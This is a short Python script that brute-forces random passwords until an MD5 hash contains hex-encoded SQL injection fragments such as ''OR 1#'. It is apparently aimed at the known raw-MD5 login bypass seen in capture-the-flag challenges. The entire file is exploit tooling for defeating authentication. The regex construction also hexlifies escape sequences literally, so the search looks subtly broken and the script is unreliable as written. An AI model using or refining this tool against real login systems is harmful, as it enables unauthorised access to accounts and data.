import secrets
import hashlib
import re
import binascii

def newpassword():
	pword = secrets.token_bytes(16)
	return pword

def hash(pword):
	m = hashlib.md5()
	m.update(pword)
	return m.hexdigest()



if __name__ == "__main__":
	codes = ["'\s+OR\s+1#", "'\s+oR\s+1#", "'\s+or\s+1#", "'\s+Or\s+1#", "'OR\s+1#", "'or\s+1#", "'Or\s+1#", "'oR\s+1#", "'\s+\|\|\s+1#", "'\|\|\s+1#", "'\|\|'\s+1"]
	patterns = []
	for i in codes:
		i = bytes(i, 'latin-1')
		i = binascii.hexlify(i)
		strcode = ''
		for x in i:
			strcode += chr(x)
		pat = re.compile(strcode)
		patterns.append(pat)
	match = None
	while match == None:
		pword = newpassword()
		hashed = hash(pword)
		for i in patterns:
			match = re.search(i, hashed)
			if match != None:
				pword = pword.hex()
				print(pword)
				print(hashed)
				print(i)
				break

	# 	i += 1


		




